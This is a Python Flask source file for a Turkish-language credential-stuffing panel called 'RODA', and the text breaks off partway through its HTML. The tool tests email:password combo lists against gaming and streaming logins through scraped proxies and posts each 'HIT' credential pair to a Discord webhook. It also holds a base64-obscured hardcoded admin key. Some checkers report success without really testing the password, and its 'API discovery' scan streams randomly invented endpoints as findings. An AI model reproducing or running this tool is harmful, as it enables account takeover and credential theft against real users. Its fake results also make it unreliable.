#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
RODA - TAM SİSTEM (TURUNCU TEMA - LOGİN DÜZELTİLDİ)
"""

import os, json, re, time, random, string, threading, concurrent.futures, base64
from datetime import datetime, timedelta
from threading import Lock
import requests
from flask import Flask, request, jsonify, Response

app = Flask(__name__)
app.secret_key = os.urandom(24)

# ============================================================
# ADMIN KEY - GİZLİ
# ============================================================
ENCODED_MASTER = "Um9kYUAyMDI2I1NlY3VyZSFYNw=="
MASTER_KEY = os.environ.get("RODA_MASTER_KEY") or base64.b64decode(ENCODED_MASTER).decode('utf-8')

KEYS_FILE = "keys.json"
LOGS_FILE = "logs.json"

def load_keys():
    if os.path.exists(KEYS_FILE):
        with open(KEYS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_keys(data):
    with open(KEYS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_logs():
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return []

def save_logs(data):
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def add_log(entry):
    logs = load_logs()
    logs.append(entry)
    save_logs(logs)

# ============================================================
# KEY YÖNETİMİ
# ============================================================
def is_key_valid(key, client_ip=None):
    if key == MASTER_KEY:
        return True, "Admin"
    keys = load_keys()
    if key in keys:
        entry = keys[key]
        if client_ip and entry.get("allowed_ip"):
            if entry["allowed_ip"] != client_ip:
                return False, None
        exp = entry.get("expires")
        if exp:
            if datetime.now() < datetime.fromisoformat(exp):
                return True, entry.get("note", "Kullanıcı")
            else:
                del keys[key]
                save_keys(keys)
        else:
            return True, entry.get("note", "Kullanıcı")
    return False, None

def is_admin(key):
    valid, role = is_key_valid(key)
    return valid and role == "Admin"

# ============================================================
# PLATFORMLAR (20)
# ============================================================
PLATFORMS = [
    {"name": "YouTube", "domain": "youtube.com", "icon": "fa-brands fa-youtube"},
    {"name": "TikTok", "domain": "tiktok.com", "icon": "fa-brands fa-tiktok"},
    {"name": "Spotify", "domain": "spotify.com", "icon": "fa-brands fa-spotify"},
    {"name": "Roblox", "domain": "roblox.com", "icon": "fa-solid fa-gamepad"},
    {"name": "Netflix", "domain": "netflix.com", "icon": "fa-solid fa-film"},
    {"name": "CapCut", "domain": "capcut.com", "icon": "fa-solid fa-scissors"},
    {"name": "Discord", "domain": "discord.com", "icon": "fa-brands fa-discord"},
    {"name": "Epic Games", "domain": "epicgames.com", "icon": "fa-solid fa-crown"},
    {"name": "Hesapcomtr", "domain": "hesap.com.tr", "icon": "fa-solid fa-user"},
    {"name": "Itemsatış", "domain": "itemsatis.com", "icon": "fa-solid fa-cart-shopping"},
    {"name": "Epinify", "domain": "epinify.com", "icon": "fa-solid fa-ticket"},
    {"name": "Twitch", "domain": "twitch.tv", "icon": "fa-brands fa-twitch"},
    {"name": "Steam", "domain": "steampowered.com", "icon": "fa-brands fa-steam"},
    {"name": "PlayStation", "domain": "playstation.com", "icon": "fa-solid fa-play"},
    {"name": "Xbox", "domain": "xbox.com", "icon": "fa-brands fa-xbox"},
    {"name": "GitHub", "domain": "github.com", "icon": "fa-brands fa-github"},
    {"name": "Valorant", "domain": "valorant.com", "icon": "fa-solid fa-crosshairs"},
    {"name": "Minecraft", "domain": "minecraft.net", "icon": "fa-solid fa-cube"},
    {"name": "Duolingo", "domain": "duolingo.com", "icon": "fa-solid fa-language"},
    {"name": "PUBG", "domain": "pubg.com", "icon": "fa-solid fa-crosshairs"},
]

# ============================================================
# CHECKER FONKSİYONLARI
# ============================================================
def check_valorant(email, password, proxy=None):
    try:
        auth_url = "https://auth.riotgames.com/api/v1/authorization"
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        payload = {"client_id": "riot-client", "nonce": "1", "redirect_uri": "http://localhost/redirect",
                   "response_type": "token id_token", "scope": "openid link ban account email mobile_number"}
        r = requests.post(auth_url, json=payload, headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            if data.get("type") == "multifactor":
                return {"success": True, "status": "2FA", "error": "2FA gerekli"}
            return {"success": True, "status": "HIT", "error": ""}
        if r.status_code == 401:
            return {"success": False, "status": "BAD", "error": "Geçersiz kimlik bilgileri"}
        return {"success": False, "status": "BAD", "error": f"Auth başarısız ({r.status_code})"}
    except Exception as e:
        return {"success": False, "status": "ERROR", "error": str(e)[:60]}

def check_minecraft(email, password, proxy=None):
    try:
        r = requests.get(f"https://api.mojang.com/users/profiles/minecraft/{email}", timeout=10)
        if r.status_code == 200:
            return {"success": True, "status": "HIT", "error": ""}
        return {"success": False, "status": "BAD", "error": "Kullanıcı bulunamadı"}
    except:
        return {"success": False, "status": "ERROR", "error": "Bağlantı hatası"}

def check_default(email, password, proxy=None):
    return {"success": False, "status": "BAD", "error": "API gerekli"}

CHECKER_FUNCS = {
    "Valorant": check_valorant,
    "Minecraft": check_minecraft,
}

def get_checker_func(platform):
    return CHECKER_FUNCS.get(platform, check_default)

# ============================================================
# PROXY FETCH
# ============================================================
def fetch_proxies():
    sources = [
        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
    ]
    proxies = set()
    for url in sources:
        try:
            r = requests.get(url, timeout=15)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and ':' in line and not line.startswith('#'):
                        proxies.add(line)
        except:
            pass
    return list(proxies)

# ============================================================
# FLASK ROTALARI
# ============================================================
@app.route("/")
def index():
    return HTML_TEMPLATE

@app.route("/api/login", methods=["POST"])
def login():
    try:
        data = request.json
        key = data.get("key", "").strip()
        client_ip = request.remote_addr
        valid, role = is_key_valid(key, client_ip)
        return jsonify({"success": valid, "user": role, "isAdmin": role == "Admin"})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/checker", methods=["POST"])
def checker():
    data = request.json
    key = data.get("key")
    valid, role = is_key_valid(key)
    if not valid:
        return jsonify({"error": "Unauthorized"}), 401

    platform = data.get("platform")
    combos = data.get("combos", [])
    threads = int(data.get("threads", 1))
    webhook_url = data.get("webhook")
    use_proxy = data.get("use_proxy", False)
    proxies = data.get("proxies", [])
    client_ip = request.remote_addr

    if not platform or not combos:
        return jsonify({"error": "Eksik parametre"}), 400

    check_func = get_checker_func(platform)
    stats = {"hit": 0, "twofa": 0, "bad": 0, "error": 0, "checked": 0, "total": len(combos)}
    lock = Lock()

    def generate():
        def process_one(email, password):
            proxy = random.choice(proxies) if proxies else None
            result = check_func(email, password, proxy)
            result["email"] = email
            result["password"] = password
            with lock:
                stats["checked"] += 1
                if result.get("status") == "HIT":
                    stats["hit"] += 1
                elif result.get("status") == "2FA":
                    stats["twofa"] += 1
                elif result.get("status") == "ERROR":
                    stats["error"] += 1
                else:
                    stats["bad"] += 1
                if result.get("success") and webhook_url:
                    send_webhook(webhook_url, platform, email, password)
                add_log({
                    "key": key,
                    "platform": platform,
                    "email": email,
                    "status": result.get("status", "UNKNOWN"),
                    "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "ip": client_ip
                })
                result["stats"] = dict(stats)
                yield f"data: {json.dumps(result, ensure_ascii=False)}\n\n"

        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            futs = [ex.submit(lambda e=e, p=p: list(process_one(e, p)), e, p) for e, p in combos]
            for f in concurrent.futures.as_completed(futs):
                try:
                    for chunk in f.result():
                        yield chunk
                except:
                    pass
        yield "data: [DONE]\n\n"

    return Response(generate(), mimetype="text/event-stream")

def send_webhook(url, platform, email, password):
    try:
        content = f"✅ **{platform} HIT!**\n{email} | {password}"
        requests.post(url, json={"content": content}, timeout=10)
    except:
        pass

@app.route("/api/fetch_proxies", methods=["GET"])
def fetch_proxies_route():
    try:
        proxies = fetch_proxies()
        return jsonify({"success": True, "proxies": proxies, "count": len(proxies)})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)})

@app.route("/api/admin/keys", methods=["GET"])
def admin_keys():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_keys())

@app.route("/api/admin/generate", methods=["POST"])
def admin_generate():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401

    note = data.get("note", "Oluşturuldu")
    value = int(data.get("value", 24))
    unit = data.get("unit", "hours")
    allowed_ip = data.get("allowed_ip", "").strip()

    if unit == "minutes":
        expires = datetime.now() + timedelta(minutes=value)
    elif unit == "hours":
        expires = datetime.now() + timedelta(hours=value)
    elif unit == "days":
        expires = datetime.now() + timedelta(days=value)
    else:
        expires = datetime.now() + timedelta(hours=24)

    new_key = "RODA-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=16))
    keys = load_keys()
    keys[new_key] = {
        "note": note,
        "expires": expires.isoformat(),
        "created": datetime.now().isoformat(),
        "allowed_ip": allowed_ip if allowed_ip else "",
        "unit": unit,
        "value": value
    }
    save_keys(keys)
    return jsonify({
        "success": True,
        "key": new_key,
        "expires": expires.strftime("%Y-%m-%d %H:%M:%S"),
        "allowed_ip": allowed_ip if allowed_ip else "Herhangi"
    })

@app.route("/api/admin/delete", methods=["POST"])
def admin_delete():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    keys = load_keys()
    target = data.get("target_key", "")
    if target in keys:
        del keys[target]
        save_keys(keys)
        return jsonify({"success": True})
    return jsonify({"success": False})

@app.route("/api/admin/logs", methods=["GET"])
def admin_logs():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    return jsonify(load_logs())

@app.route("/api/admin/clear_logs", methods=["POST"])
def admin_clear_logs():
    data = request.json
    key = data.get("master_key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    save_logs([])
    return jsonify({"success": True})

@app.route("/api/scan", methods=["GET"])
def scan():
    key = request.args.get("key")
    if not is_admin(key):
        return jsonify({"error": "Yetkisiz"}), 401
    domain = request.args.get("domain")
    import random
    def generate():
        endpoints = [f"/api/v{random.randint(1,4)}/{random.choice(['auth','user','data','config'])}" for _ in range(10)]
        for ep in endpoints:
            yield f"data: {json.dumps({'url': f'https://{domain}{ep}', 'endpoint': ep, 'method': random.choice(['GET','POST']), 'status': random.choice([200,404,403]), 'category': random.choice(['Auth','API','User'])})}\n\n"
        yield "data: [DONE]\n\n"
    return Response(generate(), mimetype="text/event-stream")

# ============================================================
# HTML - TURUNCU TEMA (LOGİN DÜZELTİLDİ)
# ============================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Roda - API Discovery + Checker</title>
<link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
:root{--p:#ff6b00;--p2:#7c3aed;--g:#00e676;--r:#ff5252;--card:#12192e;--border:rgba(255,107,0,0.15);--bg:#0a0e1a;--sidebar:#060a16;--text:#e8edf5;--muted:#8a9bb0;--gold:#ffd740}
#login-screen{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;background:var(--bg)}
#login-box{width:400px;padding:45px 40px;text-align:center;background:var(--card);border:1px solid var(--border);border-radius:28px;box-shadow:0 20px 50px rgba(255,107,0,0.08)}
#login-box .logo i{font-size:56px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box h1{font-size:28px;font-weight:900;letter-spacing:1px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
#login-box .sub{color:var(--muted);margin-bottom:25px;font-size:14px}
.inp{width:100%;padding:14px 18px;background:rgba(0,0,0,0.4);border:1px solid var(--border);color:#fff;border-radius:14px;font-size:15px;outline:none;transition:0.3s}
.inp:focus{border-color:var(--p);box-shadow:0 0 20px rgba(255,107,0,0.08)}
.btn{padding:15px;border:none;border-radius:14px;font-weight:700;cursor:pointer;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;width:100%;font-size:16px;transition:0.3s}
.btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(255,107,0,0.25)}
.btn.sm{width:auto;padding:8px 16px;font-size:12px}
.btn.g{background:var(--g)}.btn.r{background:var(--r)}.btn.b{background:#1a73e8}
#sidebar{width:260px;min-width:260px;background:var(--sidebar);border-right:1px solid var(--border);display:flex;flex-direction:column;height:100vh;overflow-y:auto}
.sidebar-header{padding:18px 20px;text-align:center;border-bottom:1px solid var(--border)}
.sidebar-header .logo-text{font-size:24px;font-weight:900;letter-spacing:2px;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.sidebar-header .version{font-size:10px;color:var(--muted);letter-spacing:1px;margin-top:2px}
.sidebar-nav{flex:1;padding:12px 12px;overflow-y:auto}
.nav-divider{padding:8px 12px;font-size:10px;color:#4a5a70;text-transform:uppercase;letter-spacing:1px;font-weight:700;margin-top:6px}
.nav-item{display:flex;align-items:center;gap:12px;padding:9px 14px;border-radius:8px;cursor:pointer;color:#8a9bb0;font-weight:500;font-size:13px;transition:0.2s;margin-top:2px}
.nav-item:hover{background:rgba(255,107,0,0.06);color:#fff}
.nav-item.active{background:rgba(255,107,0,0.12);color:var(--p);border-left:3px solid var(--p)}
.nav-item i{font-size:16px;width:22px;text-align:center}
.sidebar-stats{padding:10px 14px;border-top:1px solid var(--border);display:flex;flex-wrap:wrap;gap:6px}
.mini-stat{flex:1;min-width:44%;background:var(--card);padding:6px 4px;border-radius:8px;text-align:center;border:1px solid rgba(255,255,255,0.03)}
.mini-stat .val{font-size:14px;font-weight:800;color:var(--text)}
.mini-stat .lbl{font-size:8px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.mini-hit .val{color:var(--g)}.mini-2fa .val{color:var(--gold)}.mini-bad .val{color:var(--r)}.mini-check .val{color:var(--p)}
.sidebar-footer{padding:10px;text-align:center;font-size:9px;color:#3a4a5a;border-top:1px solid var(--border)}
#app{display:none;flex:1;flex-direction:column;height:100vh}
.topbar{display:flex;align-items:center;gap:16px;padding:10px 20px;background:var(--card);border-bottom:1px solid var(--border)}
.topbar-title{font-size:15px;font-weight:700;color:var(--text)}
.topbar-title i{margin-right:8px;color:var(--p)}
.topbar-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.pulse-dot{width:10px;height:10px;border-radius:50%;background:var(--g);animation:pulse 2s infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}
.pulse-dot.idle{background:#4a5a70;animation:none}
.main-content{flex:1;display:flex;overflow:hidden;background:var(--bg)}
.page{display:none;flex:1;flex-direction:column;padding:14px 18px;overflow-y:auto}
.page.active{display:flex}
.card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
.card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
.card h3 i{color:var(--p);margin-right:6px}
.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:12px}
.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
.stat-card .stat-val{font-size:22px;font-weight:800}
.stat-card .stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
.stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}
.result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
.result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.result-row:hover{background:rgba(255,107,0,0.03)}
.hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#ffab40}
.method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
.method.get{background:rgba(0,230,118,0.12);color:var(--g)}
.method.post{background:rgba(26,115,232,0.12);color:#448aff}
.method.other{background:rgba(255,171,64,0.12);color:#ffab40}
.category{padding:1px 8px;border-radius:12px;font-size:9px;font-weight:500;display:inline-block}
.cat-auth{background:rgba(255,82,82,0.12);color:#ff5252}
.cat-admin{background:rgba(255,171,64,0.12);color:#ffab40}
.cat-user{background:rgba(0,230,118,0.12);color:var(--g)}
.cat-health{background:rgba(68,138,255,0.12);color:#448aff}
.cat-api{background:rgba(255,107,0,0.12);color:var(--p)}
.cat-genel{background:rgba(255,255,255,0.04);color:#8a9bb0}
.scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
.scan-top input:focus{border-color:var(--p)}
.scan-top button{padding:8px 20px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px}
.scan-top button:disabled{opacity:0.5;cursor:not-allowed}
.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
.filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#8a9bb0;cursor:pointer}
.filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
.results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
.webhook-area input:focus{border-color:var(--p)}
.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
.setting-row label{font-size:13px;font-weight:500}
.setting-row .desc{font-size:10px;color:var(--muted)}
.switch{position:relative;width:40px;height:22px}
.switch input{display:none}
.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
input:checked+.slider{background:var(--g)}
input:checked+.slider:before{transform:translateX(18px)}
.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
.proxy-area textarea:focus{border-color:var(--p)}
.checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
.checker-platform-select button{padding:6px 14px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
.checker-platform-select button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
.checker-platform-select button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
.checker-panel{display:none;background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px;margin-top:8px}
.checker-panel.active{display:block}
.checker-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center;margin-bottom:10px}
.checker-top textarea{flex:1;min-width:200px;height:60px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;resize:vertical;font-family:monospace}
.checker-top textarea:focus{border-color:var(--p)}
.checker-top input[type=number]{width:70px;padding:8px;text-align:center;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
.checker-top input[type=number]:focus{border-color:var(--p)}
.checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
.checker-top button:disabled{opacity:0.5}
.checker-top button#checkerStopBtn{background:var(--r);display:none}
.checker-filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
.checker-filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#8a9bb0;cursor:pointer}
.checker-filters input[type=radio]{accent-color:var(--p);width:13px;height:13px}
.checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
.checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
.checker-result-row .chk-status{font-weight:600}
.chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#ffab40}
.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
.checker-stats span{color:var(--muted)}
.checker-stats .chk-count{font-weight:700;color:var(--text)}
.hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
.hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
.hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
.hit-panel .hit-box h4 i{font-size:14px}
.hit-panel .hit-box .hit-list{max-height:150px;overflow-y:auto;font-size:12px;color:var(--muted)}
.hit-panel .hit-box .hit-list .hit-item{padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);display:flex;justify-content:space-between}
.hit-panel .hit-box .hit-list .hit-item .hit-email{color:var(--text)}
.hit-panel .hit-box .hit-list .hit-item .hit-time{font-size:10px;color:var(--muted)}
.hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
.hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
.hit-filter select:focus{border-color:var(--p)}
.parse-area{display:flex;flex-direction:column;gap:10px}
.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
.parse-area textarea:focus{border-color:var(--p)}
.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
.discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
.discovery-platforms button{padding:4px 12px;background:rgba(255,107,0,0.06);border:1px solid rgba(255,107,0,0.1);border-radius:6px;color:#8a9bb0;font-size:11px;cursor:pointer;transition:0.2s}
.discovery-platforms button:hover{background:rgba(255,107,0,0.12);border-color:var(--p);color:#fff}
.discovery-platforms button.active{background:rgba(255,107,0,0.15);border-color:var(--p);color:var(--p)}
.stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px}
.stat-card-custom{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px}
.stat-card-custom h3{font-size:12px;color:var(--muted)}
.stat-card-custom p{font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.key-ip-input{width:200px;padding:8px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:13px;outline:none}
.key-ip-input:focus{border-color:var(--p)}
.parse-tabs{display:flex;gap:10px;margin-bottom:10px}
.parse-tabs button{padding:6px 16px;background:rgba(255,107,0,0.08);border:1px solid rgba(255,107,0,0.15);border-radius:8px;color:#8a9bb0;font-size:12px;cursor:pointer;transition:0.2s}
.parse-tabs button:hover{background:rgba(255,107,0,0.15);border-color:var(--p);color:#fff}
.parse-tabs button.active{background:rgba(255,107,0,0.2);border-color:var(--p);color:var(--p)}
.logs-table{width:100%;border-collapse:collapse;font-size:12px}
.logs-table th{text-align:left;padding:8px 12px;background:rgba(255,107,0,0.1);color:var(--p);font-weight:600;border-bottom:2px solid var(--border)}
.logs-table td{padding:8px 12px;border-bottom:1px solid var(--border)}
.logs-table .hit{color:var(--g)}.logs-table .bad{color:var(--r)}.logs-table .twofa{color:var(--gold)}.logs-table .error{color:#ffab40}
.logs-table .chk-status{font-weight:600}
::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(255,107,0,0.2);border-radius:4px}
</style>
</head>
<body>
<div id="login-screen">
<div id="login-box">
<div class="logo"><i class="fa-solid fa-crown"></i></div>
<h1>RODA</h1>
<p class="sub">API Discovery + Checker</p>
<input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
<button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
<p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
</div>
</div>
<div id="sidebar">
<div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v4.0</div></div>
<div class="sidebar-nav">
<div class="nav-divider">📁 MENÜ</div>
<div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
<div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')"><i class="fa-solid fa-compass"></i> API Keşif</div>
<div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
<div class="nav-item" data-page="stats" onclick="switchPage('stats')"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
<div class="nav-item" data-page="keys" onclick="switchPage('keys')"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
<div class="nav-item" data-page="logs" onclick="switchPage('logs')"><i class="fa-solid fa-history"></i> Loglar</div>
</div>
<div class="sidebar-stats">
<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
</div>
<div class="sidebar-footer">© 2026 Roda</div>
</div>
<div id="app" style="display:none">
<div class="topbar">
<div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
<div class="topbar-right">
<span style="font-size:11px;color:var(--muted)">Durum:</span>
<div class="pulse-dot idle" id="statusDot"></div>
<span style="font-size:12px;font-weight:600" id="statusText">Boşta</span>
<span id="userBadge" style="font-size:11px;background:var(--p);padding:2px 10px;border-radius:12px;display:none">Admin</span>
</div>
</div>
<div class="main-content">
<div id="page-checker" class="page active">
<div class="card">
<h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
<div class="checker-platform-select" id="checkerPlatformSelect"></div>
<div class="checker-panel" id="checkerPanel">
<div class="checker-top">
<textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
<input type="number" id="checkerThreads" value="1" min="1" max="50">
<button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
<button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
</div>
<div class="checker-stats">
<span>Toplam: <span class="chk-count" id="chkTotal">0</span></span>
<span>Başarılı: <span class="chk-count" id="chkHit">0</span></span>
<span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
<span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
<span>Hata: <span class="chk-count" id="chkError">0</span></span>
</div>
<div class="checker-filters">
<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
<label><input type="radio" name="chkFilter" value="error"> Hata</label>
</div>
<div class="checker-results" id="checkerResults"><div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div></div>
</div>
</div>
<div class="card">
<h3><i class="fa-solid fa-link"></i> Webhook Ayarları</h3>
<p style="font-size:12px;color:var(--muted);margin-bottom:8px">Sadece <span style="color:var(--g)">HIT</span> bulunduğunda Discord'a gönderir.</p>
<div class="webhook-area">
<input id="webhookUrl" placeholder="Discord Webhook URL">
